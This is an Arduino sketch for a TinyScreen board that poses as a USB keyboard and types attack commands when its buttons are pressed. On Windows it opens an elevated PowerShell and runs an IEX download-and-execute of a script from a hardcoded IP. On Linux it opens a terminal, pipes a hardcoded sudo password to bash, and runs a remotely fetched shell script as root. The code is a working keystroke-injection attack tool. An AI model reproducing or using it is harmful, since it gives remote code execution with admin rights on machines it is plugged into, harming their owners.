#include <Keyboard.h>
#include <TinyScreen.h>
#include <Wire.h>
#include <SPI.h>

TinyScreen display = TinyScreen(TinyScreenDefault);


void setup(void) {
  Wire.begin();
  display.begin();
  Keyboard.begin();
  display.setBrightness(10);
}

void readInput() {
  
  display.setFont(thinPixel7_10ptFontInfo);
  display.fontColor(TS_8b_White,TS_8b_Black);
  display.clearScreen();
  display.setCursor(48 - (display.getPrintWidth("Press a Button!") / 2), 32 - (display.getFontHeight() / 2));
  display.print("Press a Button!");
  unsigned long startTime = millis();
  while (millis() - startTime < 3000)buttonLoop();
}

void buttonLoop() {
  display.setCursor(0, 0);
  //getButtons() function can be used to test if any button is pressed, or used like:
  //getButtons(TSButtonUpperLeft) to test a particular button, or even like:
  //getButtons(TSButtonUpperLeft|TSButtonUpperRight) to test multiple buttons
  //results are flipped as you would expect when setFlip(true)
  if (display.getButtons(TSButtonUpperLeft)) {
    display.println("Pressed!");
  } else {
    display.println("          ");
  }
  display.setCursor(0, 54);
  if (display.getButtons(TSButtonLowerLeft)) {
    display.println("Pressed!");
    windows_command("Windows");
    display.print("Completed!");
  } else {
    display.println("Windows");
  }
  display.setCursor(95 - display.getPrintWidth("Pressed!"), 0);
  if (display.getButtons(TSButtonUpperRight)) {
    display.println("Pressed!");
    linux_command();
  } else {
    display.println("Linux");
  }
  display.setCursor(95 - display.getPrintWidth("Pressed!"), 54);
  if (display.getButtons(TSButtonLowerRight)) {
    display.println("Pressed!");
  } else {
    display.println("          ");
  }
}

void writeText(){
  display.clearScreen();
  //setFont sets a font info header from font.h
  //information for generating new fonts is included in font.h
  
  //getPrintWidth(character array);//get the pixel print width of a string
  int width=display.getPrintWidth("Example Text!");
  //setCursor(x,y);//set text cursor position to (x,y)- in this example, the example string is centered
  display.setCursor(48-(width/2),10);
  //fontColor(text color, background color);//sets text and background color
  display.fontColor(TS_8b_Green,TS_8b_Black);
  display.print("Example Text!");
  display.setCursor(15,25);
  display.fontColor(TS_8b_Blue,TS_8b_Black);
  display.print("More example Text!");
  display.setCursor(3,40);
  display.fontColor(TS_8b_Red,TS_8b_Black);
  display.print("(Does not wrap)");
  delay(1000);
}

void windows_command(char arg1[]){
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(500);
  Keyboard.releaseAll();
  delay(500);
  Keyboard.print("powershell");
  delay(1000);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(500);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('y');
  Keyboard.releaseAll();
  delay(1000);

  Keyboard.print("IEX (New-Object Net.WebClient).DownloadString('http://35.212.247.53/run.ps1')");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(10000);
  
  Keyboard.print("exit");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
}

void linux_command(){
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('t');
  Keyboard.releaseAll();
  delay(1000);
  
  Keyboard.print("history -w");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1000);

  
  Keyboard.print("sudo -S <<< \"Helloworld1234!\" bash -c \"$(wget -q 0 -O - http://35.212.247.53/runsh.sh)\"");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1000);
  
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(10000);
  Keyboard.print("exit");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
}

void loop() {
  readInput();
}

